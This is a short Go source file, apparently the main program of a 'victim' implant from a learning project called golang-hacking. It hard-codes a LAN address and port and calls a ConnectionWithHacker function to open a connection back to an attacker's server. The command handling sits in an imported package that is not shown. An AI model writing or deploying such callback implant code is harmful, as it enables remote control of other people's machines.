package main

import (
	"fmt"
	"golang-hacking/VictimFinalVersion/core/handleConnection"
	"log"
)

func main() {
	ServerIP := "192.168.10.191"
	Port := "9090"
	connection, err := handleConnection.ConnectionWithHacker(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())

}
